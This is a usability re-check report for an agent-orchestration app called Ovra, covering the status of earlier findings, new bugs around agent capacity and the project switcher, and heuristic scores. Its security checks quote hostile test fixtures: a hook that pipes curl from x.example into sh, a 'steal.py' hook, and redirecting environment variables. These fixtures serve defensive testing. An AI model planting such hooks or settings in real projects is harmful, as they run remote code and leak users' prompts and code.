# First-run re-check after iteration 3 (2026-11-25)

Build: 07f5977, headless, scripted fake agent, Chromium 158.0.8127.36, 1280x800
(and 640x400 for the stacked layout).
Scope: every major finding of the first-run round (NEW-1..5, ORCH-1..4,
SEC-1..4) and the minors listed under iteration 3 in `summary.md`. The
features added for them were also checked for new problems: the project
switcher, the trust buttons' arming delay, the approvals "seen" rule, "N of 3
agents working" with queued workers, the "Changed files" block and the "Keep
changes" wording. Personas, in turn: newcomer (Nadia), agent orchestrator
(Andrii), security reviewer (Sofia).
Fixtures: `small` (demo-app, seeded), `monorepo`, `empty`.

Limits of the fake: it runs without a sandbox, its Edit changes nothing, and
its setup is always "ready". To see the "Changed files" block, the script
edited README.md itself and rewrote the `review.list` replies (`by:
"agent"`) with `page.routeWebSocket`. The account picker states were made
by rewriting `agents.accounts` the same way. Note for Playwright scripts:
`click()` waits while a button is `aria-disabled`, so an early click has to
be a raw `page.mouse.click`.

## Summary

All three personas can now finish their jobs without workarounds. Nadia sees
what her first task changed and where to keep it, finds her way back to other
projects, and keeps her project and task names after a reload. Andrii sees his
tasks first, sees which task each worker belongs to on cards and toasts, and
steps out of the inbox to a waiting approval. Sofia can no longer trust a
project with a stray Enter, and risky environment variables are named.

Of the 13 majors, 9 are fixed and 4 are partly fixed; of the 10 minors in
scope, 6 are fixed and 4 partly fixed. Nothing regressed. The new project-wide
cap brought two new major problems. A task whose workers are queued says
"Done" and sends a "done" toast before any worker has started. A finished
"One agent, here" session still counts as "working", so it takes one of the 3
places and makes workers queue. The first session now feels finished: the
newcomer's Nielsen score rises from 24/40 to 30/40.

## Status of earlier findings

Script names refer to the scratch scripts run for this re-check (n1-n3
newcomer, o1 orchestrator, s1-s2 security); their steps are summarised in
the table.

### Majors

| ID     | Status       | Steps used and what happened                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| ------ | ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| NEW-1  | fixed        | n2: open demo-app, "Fix the typo in the readme", One agent here, allow both requests (README.md edited while the first waited, `by` rewritten to `agent`). The session shows "Changed files (1) · README.md +1 -1 · Already in your folder. Keep or undo them in Reviews. [Review]". Clicking README.md opens its diff in the main area. Review opens the inbox on "Direct agent: Fix the typo in the readme" with "Keep changes leaves them in your project folder." The toast reads "… is done and changed 1 file. Keep or undo it in Reviews. [Review]" (`final-3-changed-files.png`).   |
| NEW-2  | fixed        | n1/n2: a one-agent task ends with the row and status "Done, you can reply" and the toast "Fix the typo in the readme is done. Reply to ask for more." A split task ends with the toast "Task: Write notes for docs, tests and lint: 3 changes wait for your review [Review]" and "3 changes wait for your review. [Review]" in the session (`final-4-split-done.png`). See ORCH-10 for a new wrong "done".                                                                                                                                                                                  |
| NEW-3  | fixed        | n1: the header shows "Project demo-app ▾" as a menu button. It lists "Recent projects", "Open a folder…" and "Close project"; Escape returns focus to it, and ArrowDown opens it on the first item. "Open a folder…" led to the start screen, and the `empty` folder opened. Back through the switcher, the tasks were still there. See NEW-11 for one rough edge.                                                                                                                                                                                                                          |
| NEW-4  | fixed        | n1, n3: a reload, idle or with a request waiting, reopens demo-app. The task keeps its name, and the card reads "Fix the typo in the readme in demo-app asks to use Bash", not "Session s1".                                                                                                                                                                                                                                                                                                                                                                                                |
| NEW-5  | partly fixed | n2: tool lines read "Command / Run ls -la", "File change / Edit README.md", "Task step / Start worker docs: Write the docs notes.". Coordinator notes read "Ovra / Worker docs asked for review." with the instruction folded under "What Claude was told". No "Turn ended: 0 tokens" lines. Left: each Task step repeats itself ("Task: Write the docs notes." under "Start worker docs: Write the docs notes."), and its "Tool output (1 line)" fold shows raw JSON: `{"agent_id":"s3","branch":"ovra/t1/docs","name":"docs","worktree":"/tmp/…/t1/docs"}`.                               |
| ORCH-1 | fixed        | o1: two split tasks, 3 requests waiting, open Reviews. The inbox shows "3 approvals waiting [Go to approvals (Alt+Shift+A)]" under its title. Alt+Shift+A closes the inbox and focuses the oldest request. After answering by mouse, focus returns to "Reviews". Left (polish): toasts are still drawn under the dialog (`elementFromPoint` on a toast hits the inbox's `patch-view`), but the inbox line now covers their job.                                                                                                                                                             |
| ORCH-2 | partly fixed | o1: tasks "Write release notes for 2.1" and "… 2.2". Cards say "docs · Write release notes for 2.1 in demo-app asks to use Write", and every toast uses the final name. None fell back to "Session sN". Left: in the Tasks list, every title is clipped to 101-140 px, so both tasks' workers read "docs · Write rele…" and both tasks read "Task: Write relea…" (`o03-two-splits`). Only the grouping order tells them apart.                                                                                                                                                              |
| ORCH-3 | fixed        | o1: split A gives "3 of 3 agents working". A "here" start is refused, with "Could not start: 3 agents are already working in this project, the most at once. Start this when one of them finishes, or stop one." and the prompt is kept. Split B gives "3 of 3 agents working, 3 waiting", and its workers show "Waiting for a free agent". They started as places freed. The mode hint now says "At most 3 agents work at once in a project; others wait for a free one." New problems: ORCH-10, ORCH-11.                                                                                  |
| ORCH-4 | fixed        | o1, n2: once a task exists, "Tasks" with the capacity line comes first. Claude setup collapses to "Claude is ready · Change", and the form is 2 rows. With 8 rows and 3 requests waiting at 1280x800, all 8 rows are visible (Tasks heading at y 416). The prompt field drops to y 762, at the bottom edge.                                                                                                                                                                                                                                                                                 |
| SEC-1  | fixed        | s1: Ctrl+Shift+P, type "trust", Enter, then Enter at once and again 0.7 s later. Focus lands on the card heading `h3#trust-heading`, and the project stays untrusted. Trust buttons have `aria-disabled` and the tooltip "Read the card first" for 500 ms after the card changes. See SEC-11 for an early click.                                                                                                                                                                                                                                                                            |
| SEC-2  | partly fixed | s2: 640x400, start a task, click Review on the toast, wait 0.7 s, press Y. The page scrolls so that the command (`ls -la`, y 324-400) is in sight before Y counts, so the main risk is gone. Left: the whole page scrolls (the header leaves the screen). The "who asks" line and the yellow "No sandbox: what you allow can reach anything your user can." are above the visible list, and the action heading is cut at its top (y 281, list from 287). Allow and Deny (y 408-432) are below the window. Y allowed a request whose sandbox warning was not in sight (`s11-narrow-review`). |
| SEC-3  | fixed        | s1: env `ANTHROPIC_BASE_URL`, `NODE_OPTIONS`, `FOO`. The card shows "⚠ Project settings set ANTHROPIC_BASE_URL and NODE_OPTIONS: once you trust this project, they can send your prompts and code elsewhere or run code." FOO is not flagged. `HTTPS_PROXY`, added later, gets its own line in the changed card. Left (minor): the warning does not say where (llm-proxy.example.com), and the "Environment variables" group in the details still opens closed (`env:false`).                                                                                                               |
| SEC-4  | partly fixed | s1: three accounts (rewritten), with Work, which bills an API key, as the project's account. The picker options read "Personal / Work (API key) / Client (not signed in)", and under it: "Work bills an Anthropic API key, at API prices." After picking Client: "Client: not signed in. Agents started with it will fail; Manage under Claude above shows how to fix it." Left: Start stays enabled with a signed-out account (`START-ENABLED true`), so the failure comes after the press.                                                                                                |

### Minors in scope of iteration 3

| ID     | Status       | Steps used and what happened                                                                                                                                                                                                                                                                                                                                                               |
| ------ | ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| NEW-6  | partly fixed | s1: with settings, every warning is conditional: "⚠ Once you trust this project, Claude will use Bash(*) without asking you." The lead line is "Trusting lets Claude use…". Left: a project with no settings still shows "No Claude settings in this project / Trust project / Trusting it starts language servers…" above the task form on the first screen (`final-1-project-open.png`). |
| NEW-7  | partly fixed | s1: the details say "in the sandbox" ("bubblewrap…" only in the tooltip). The group heading reads "Hooks: commands that run on agent events · runs code". Left: raw rules such as "SessionStart: curl -s https://x.example \| sh" still have no plain line above them.                                                                                                                     |
| NEW-8  | partly fixed | n1, n2: a raw click on Allow 0.1 s after the request appears does nothing. The button is at 0.55 opacity with cursor `default`, and the note "Ready in a moment — read the request first." appears. At 1280x800 the note sits at y 382-397, below the approvals list's visible bottom (y 377), so Nadia does not see it (`final-2-first-approval.png`).                                    |
| NEW-9  | fixed        | n2, o1: "Approvals" holds Allow/Deny; "Reviews" holds "Keep changes / Reject…"; the inbox says "Changes agents made, waiting for you to keep or reject."                                                                                                                                                                                                                                   |
| SEC-5  | fixed        | o1, s2: the title reads "(3) Ovra" with three requests waiting and "Ovra" when none wait. The offer of system notifications was not part of this fix and was not checked.                                                                                                                                                                                                                  |
| SEC-6  | fixed        | s1: invalid `settings.local.json`. The warning reads "⚠ Ovra could not read .claude/settings.local.json (key must be a string at line 1 column 3); whatever it holds, hooks too, may load once you trust this project." The unreadable group opens with the details. The button is still a plain "Trust project" (the suggested "Trust without checking…" label was not taken).            |
| SEC-7  | partly fixed | s1: trust, then add a PreToolUse hook. The changed card quotes it: "⚠ Once you trust the changes, 1 new hook will run commands on your computer: "PreToolUse (Bash): python3 ~/.cache/steal.py"." Left: the lead line is still "Claude runs without them until you trust the changes.", which can be read as "without the changes" only.                                                   |
| SEC-10 | fixed        | s1: warning lines start with "⚠" and are weight 600 (`rgb(255, 211, 107) 600`).                                                                                                                                                                                                                                                                                                            |
| ORCH-5 | fixed        | o1: menu items "Audit log / Project policies / Network and secrets / Servers Ctrl+Shift+S / Agent browser Ctrl+Shift+B" match the palette, have test ids `open-audit` … `open-browser`, and P jumps to "Project policies". Audit log, Policies and Network still have no default key (not in scope).                                                                                       |
| ORCH-6 | fixed        | o1: after the last request was answered by mouse, the approvals section has height 0 and focus goes back (to Reviews, where the jump came from). No overlay is left.                                                                                                                                                                                                                       |

Not in scope, seen along the way: NEW-10 is still open (the first screen
flashes "Checking Claude… / Use another Claude account" for about 200 ms,
`n1/01-first`). ORCH-7 is still open (the mode is back to "One agent, here"
after a reload). The Reviews empty-state hint from NEW-1 was not needed once
the "Changed files" block existed.

Counts: 15 fixed, 8 partly fixed, 0 still open, 0 regressed (of 23 re-checked).

## Findings

### ORCH-10 major: a task whose workers wait for a free agent says "Done" and sends a "done" toast

- **Area:** ui/src/agents (`status.ts`, `sessions.status` for coordinators); ui/src/notify (`agent-events.ts`)
- **Steps:** 1. Plan and split "Write release notes for 2.1"; its 3 workers take every place. 2. Plan and split "Write release notes for 2.2".
- **Expected:** task 2.2 reads "Workers are on it" or "3 workers wait for a free agent". No toast until its workers have done something.
- **Actual:** the row "Task: Write release notes for 2.2" shows "Done, you can reply" next to three "Waiting for a free agent" rows. The toast "Task: Write release notes for 2.2 is done. Reply to ask for more." appears before any of its workers has started (`o03-two-splits`). Task 2.1, whose workers run, correctly shows "Workers are on it".
- **Why it matters:** Andrii reads the status column as his dashboard and sees a finished task that has not started. Nadia takes "is done" literally and replies or looks for a result that does not exist. The capacity feature made this state common: every second split task hits it.
- **Suggested fix:** a coordinator with queued or working workers is not done: show "Workers are on it (3 waiting for a free agent)". Send the "done" toast only when none of its workers is queued or working, as the "N changes wait for your review" toast already does. Add a unit test with a queued worker.

### ORCH-11 major: a finished "One agent, here" session still counts as working and holds one of the 3 places

- **Area:** crates/core/src/orchestration (`slots.rs`, `count`); ui/src/agents (capacity line)
- **Steps:** 1. Run "Fix the typo in the readme" with One agent here and allow both requests; the row says "Done, you can reply". 2. Read the capacity line. 3. Plan and split "Write notes for docs, tests and lint".
- **Expected:** "0 of 3 agents working"; all three workers start.
- **Actual:** "1 of 3 agents working" while the only agent is done (`final-3-changed-files.png`). The split task then shows "3 of 3 agents working, 1 waiting", and its lint worker waits "for a free agent" while only two workers work. After everything finished, the line still read "1 of 3 agents working" with every row "Done, you can reply" (`final-4-split-done.png`). `count` skips idle workers that asked for review, but not an idle direct session.
- **Why it matters:** Andrii always keeps a direct agent around, so he silently loses a third of his parallel workers, and the number he was told to trust is wrong. Nadia sees "working" next to "Done" and wonders what is still running.
- **Suggested fix:** do not count an idle direct session (it does nothing until a message wakes it, like an idle reviewed worker). When a message wakes it while the project is full, queue it or refuse with the existing message. If the owner wants idle sessions to hold a place, say so instead: "1 of 3 places taken (1 agent waits for your reply)", with Stop as the way to free it.

### NEW-11 minor: "Open a folder…" in the switcher closes the current project before a new one is chosen

- **Area:** ui/src/shell (`open-folder.ts`, `ProjectSwitcher.svelte`)
- **Steps:** 1. In demo-app, with a finished task, click "Project demo-app ▾". 2. Choose "Open a folder…". 3. Change your mind.
- **Expected:** a folder field (or dialog) over the current project; Escape or Cancel returns to it.
- **Actual:** in the browser (no system dialog), the header turns to "No project open", and the tree, tasks and task form disappear. The cursor sits in the start screen's folder field (`n1/08-open-folder`). The only way back is the "Recent" list, and Escape does nothing.
- **Why it matters for Nadia:** it looks as if her project and her task were closed. "Close project" is the next item in the same menu, so the two feel the same.
- **Suggested fix:** open the folder field inside the menu or a small dialog (with the same path checks), and close the current project only once the new one opens. Or keep the project and show the start screen with a "Back to demo-app" button.

### NEW-12 minor: the task's Review button opens the inbox on another item

- **Area:** ui/src/agents (`openReviews`), ui/src/inbox
- **Steps:** 1. Review a "here" task's change from its Changed files block, then close the inbox. 2. Run a split task to the end. 3. Press "Review" next to "3 changes wait for your review."
- **Expected:** the inbox opens on the first of this task's workers.
- **Actual:** it opens on "Direct agent: Fix the typo in the readme", the item selected last time, with its Keep changes button. The task's three workers are in the list above (`n2/16-reviews-split`).
- **Why it matters for Nadia:** she pressed Review for the notes task and is shown the readme typo. A "Keep changes" press there keeps the wrong thing.
- **Suggested fix:** let `openReviews` take the session or task, and have the inbox select that item (the first waiting worker of the task). Do the same for the Review buttons on toasts.

### SEC-11 minor: an early click on "Trust project" is ignored with no visible reason

- **Area:** ui/src/agents/setup (`ProjectTrust.svelte`)
- **Steps:** 1. Open a project with `.claude/settings.json`. 2. Click "Trust project" as soon as the card appears, or within 0.5 s of pressing "Show details" (which arms the button again).
- **Expected:** the button says why it waits, as approvals now do ("Ready in a moment — read the request first.").
- **Actual:** nothing happens. The only hint is the tooltip "Read the card first", and the button looks the same as when enabled (`s10-early-trust`).
- **Why it matters for Sofia:** the guard is right, but a silent miss makes people click again, and the second click is the one that trusts. This is the pattern NEW-8 fixed for approvals.
- **Suggested fix:** reuse the approvals' visible, `aria-live` note under the buttons ("Ready in a moment — read the card first.") and the dimmed style while not armed.

### ORCH-12 polish: the split task's toast reads "Task: …: 3 changes wait"

- **Area:** ui/src/notify (`agent-events.ts`)
- **Steps:** finish a split task.
- **Actual:** "Task: Write release notes for 2.1: 3 changes wait for your review": two colons in one line.
- **Suggested fix:** "Write release notes for 2.1: 3 changes wait for your review", or "3 changes from "Write release notes for 2.1" wait for your review".

## What worked well

- The end of a first task is now clear: one status ("Done, you can reply"),
  one toast that agrees with it, and a "Changed files" block whose file opens
  the diff in one click and whose Review button leads to "Keep changes".
- The project switcher behaves like a real menu button: arrows, Escape back
  to the button, "Recent projects" with paths, and it keeps the tasks of a
  project when you come back to it. A reload restores project and names.
- The capacity line and the queue are honest for workers: "3 of 3 agents
  working, 3 waiting", "Waiting for a free agent", and a refused start explains
  itself and keeps the prompt.
- Names are consistent on cards and toasts ("docs · Write release notes for
  2.1"), and toasts never fell back to "Session sN".
- The inbox's "3 approvals waiting [Go to approvals (Alt+Shift+A)]" line and
  the step-out shortcut fix the hidden-approval trap without a second modal.
- The trust card now reads as a decision: every risk is conditional ("Once you
  trust this project…"), marked with ⚠ and bold, names the hook command, the
  risky environment variables and the unreadable file with its reason.
- The window title counts waiting requests ("(3) Ovra").
- The column turns into a working view after the first task: tasks first,
  setup reduced to one line, a two-row form.

## Heuristic scores (Nielsen, 0-4), a newcomer's first session

Same session as in `newcomer.md`: open a folder, run a first task with "One
agent, here", answer the requests, find the result; then a "Plan and split"
task, Reviews, and another folder.

| #         | Heuristic                       | Before    | Now       | Key issue now                                                                                                                     |
| --------- | ------------------------------- | --------- | --------- | --------------------------------------------------------------------------------------------------------------------------------- |
| 1         | Visibility of system status     | 2         | 3         | End state and changed files are clear; "1 of 3 agents working" next to "Done" (ORCH-11), a task "done" before it starts (ORCH-10) |
| 2         | Match with the real world       | 2         | 3         | Plain tool lines and notes; raw JSON with `agent_id` behind "Tool output", "Task:" prefixes                                       |
| 3         | User control and freedom        | 2         | 3         | Switcher and reload work; "Open a folder…" closes the project first (NEW-11)                                                      |
| 4         | Consistency and standards       | 2         | 3         | Approvals/Allow vs Reviews/Keep changes; "working" vs "Done" still disagree                                                       |
| 5         | Error prevention                | 3         | 3         | Arming, "seen" rule and trust guard; early-click note hidden below the list (NEW-8), silent trust miss (SEC-11)                   |
| 6         | Recognition rather than recall  | 2         | 3         | Project switcher and menu shortcuts visible; clipped task rows                                                                    |
| 7         | Flexibility and efficiency      | 3         | 3         | Shortcuts shown in the More menu and start panel; mode not kept on reload                                                         |
| 8         | Aesthetic and minimalist design | 3         | 3         | Tasks-first column; "Trust project" for a project without settings still sits above the form                                      |
| 9         | Error recognition and recovery  | 3         | 3         | Clear refusal at the cap with a way forward; Start allowed with a signed-out account                                              |
| 10        | Help and documentation          | 2         | 3         | "Already in your folder. Keep or undo them in Reviews." answers the old question                                                  |
| **Total** |                                 | **24/40** | **30/40** | **Good**                                                                                                                          |
